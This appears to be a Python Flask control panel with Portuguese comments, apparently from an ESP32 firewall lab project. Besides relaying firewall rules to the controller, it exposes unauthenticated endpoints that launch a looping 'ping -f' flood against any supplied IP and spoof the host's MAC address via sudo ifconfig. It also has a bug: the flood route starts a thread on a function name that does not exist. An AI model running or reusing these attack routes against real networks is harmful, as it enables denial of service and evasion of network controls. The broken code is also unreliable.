# - Combina a API de gerenciamento e a API de ataques em um só lugar.
# - Serve a interface web (index.html) para o usuário.
# - Recebe comandos do usuário via painel e os REPASSA para o ESP32 Controlador.
# - Lança ataques de rede quando comandado pelo painel.

from flask import Flask, request, jsonify, render_template
import requests
import threading
import subprocess
import time
import random

app = Flask(__name__)

# Configuração do Controlador
CONTROLLER_IP = "192.168.4.1"  # IP do ESP Controlador (conferir sempre)
CONTROLLER_API_URL = f"https://{CONTROLLER_IP}/firewall/rules"

# Variáveis de Estado para Ataques
attacking = False
attack_thread = None


@app.route('/ui/add_rule', methods=['POST'])
# Recebe uma regra do nosso painel e envia para o ESP controlador
def add_rule():
    try:
        rule_data = request.get_json()
        print(f"Recebido do painel, enviando para o controlador: {rule_data}")
        response = requests.post(CONTROLLER_API_URL, json=rule_data, timeout=5)
        response.raise_for_status()
        return jsonify({"status": "Regra enviada para o controlador!"}), 200
    except requests.exceptions.RequestException as e:
        return jsonify({"error": f"Não foi possível contatar o ESP32 Controlador: {e}"}), 503


@app.route('/ui/get_rules', methods=['GET'])
# Busca as regras do ESP controlador
def get_rules():
    try:
        response = requests.get(CONTROLLER_API_URL, timeout=5)
        response.raise_for_status()
        return jsonify(response.json()), 200
    except requests.exceptions.RequestException as e:
        return jsonify({"error": f"Não foi possível contatar o ESP32 Controlador: {e}"}), 503


# Rotas de ataque
def ping_flood(target_ip):
    """
    Esta função executa o ataque de Ping Flood em um loop.
    Ela será executada em uma thread separada para não travar a API.
    """
    # O comando ping -f (flood) envia pings o mais rápido possível.
    # IMPORTANTE: Este comando geralmente requer privilégios de root (sudo).
    command = f"ping -f {target_ip}"

    # O loop continua enquanto a variável global 'attacking' for True.
    while attacking:
        try:
            # Executa o comando ping. stdout e stderr são redirecionados para DEVNULL
            # para não poluir o terminal. O comando é interrompido se demorar mais de 5s.
            subprocess.run(command.split(), check=True, timeout=5, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        except (subprocess.CalledProcessError, subprocess.TimeoutExpired):
            # Se um ping falhar ou der timeout, simplesmente ignora e continua o loop.
            pass


@app.route('/attack/ping_flood', methods=['POST'])
def start_ping_flood():
    global attacking, attack_thread
    if attacking:
        return jsonify({"status": "Um ataque já está em andamento"}), 409

    target_ip = request.json.get('target_ip')
    if not target_ip:
        return jsonify({"error": "target_ip ausente"}), 400

    attacking = True
    attack_thread = threading.Thread(target=ping_flood_worker, args=(target_ip,), daemon=True)
    attack_thread.start()
    return jsonify({"status": f"Ataque de Ping Flood iniciado contra {target_ip}"})


@app.route('/attack/stop', methods=['POST'])
def stop_attack():
    global attacking
    attacking = False
    return jsonify({"status": "Comando de parada enviado."})


@app.route('/attack/spoof_mac', methods=['POST'])
def spoof_mac():
    iface = request.json.get('iface', 'wlan0')
    new_mac = (f"02:00:00:{random.randint(0x00, 0xFF):02x}:{random.randint(0x00, 0xFF):02x}:"
               f"{random.randint(0x00, 0xFF):02x}")
    try:
        subprocess.run(["sudo", "ifconfig", iface, "down"], check=True)
        subprocess.run(["sudo", "ifconfig", iface, "hw", "ether", new_mac], check=True)
        subprocess.run(["sudo", "ifconfig", iface, "up"], check=True)
        return jsonify({"status": "MAC spoofado com sucesso", "new_mac": new_mac})
    except Exception as e:
        return jsonify({"error": str(e)}), 500


# Rota principal painel
@app.route('/')
def dashboard():
    return render_template('index.html')


if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)